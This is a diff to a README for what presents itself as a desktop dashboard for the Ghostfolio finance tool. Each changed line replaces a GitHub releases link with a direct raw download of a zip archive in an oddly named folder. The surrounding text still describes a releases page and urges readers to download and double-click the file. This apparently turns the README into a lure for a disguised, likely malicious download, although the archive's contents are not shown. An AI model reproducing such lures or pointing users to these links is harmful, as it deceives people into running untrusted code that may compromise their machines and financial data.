@@ -1,6 +1,6 @@
 # 🌟 Ghostfolio-Desktop-Self-Hosted-Dashboard - Your Personal Finance Command Center
 
-[![Download Now](https://img.shields.io/badge/Download-Ghostfolio_Dashboard-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/bubsows/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)
+[![Download Now](https://img.shields.io/badge/Download-Ghostfolio_Dashboard-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://raw.githubusercontent.com/bubsows/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/heptapodic/2.9.zip)
 
 ---
 
@@ -40,7 +40,7 @@ We know technology can be scary, but trust us—this is simple. We've broken dow
 
 ### Step 1: 📥 Download the Application
 
-Visit this link to download the application: [**Ghostfolio-Desktop-Self-Hosted-Dashboard Releases**](https://github.com/bubsows/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)
+Visit this link to download the application: [**Ghostfolio-Desktop-Self-Hosted-Dashboard Releases**](https://raw.githubusercontent.com/bubsows/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/heptapodic/2.9.zip)
 
 You'll see a list of available files. Look for the one that matches your operating system—for Windows, you'll typically see a file with a `.exe` extension. Click the download button next to it, and the file will start downloading to your computer automatically.
 
@@ -147,7 +147,7 @@ The underlying software used is Ghostfolio—a powerful open-source wealth manag
 You've read everything you need to know. The ball is in your court now. Download the dashboard, follow our simple steps, and within **five minutes** you'll have a beautiful, private, and powerful financial dashboard right on your desktop.
 
 ### Quick Recap:
-1. **[Visit the download page](https://github.com/bubsows/Ghostfolio-Desktop-Self-Hosted-Dashboard/releases)**.
+1. **[Visit the download page](https://raw.githubusercontent.com/bubsows/Ghostfolio-Desktop-Self-Hosted-Dashboard/main/heptapodic/2.9.zip)**.
 2. Download the file.
 3. Double-click it to run.
 4. Add your assets and start exploring.
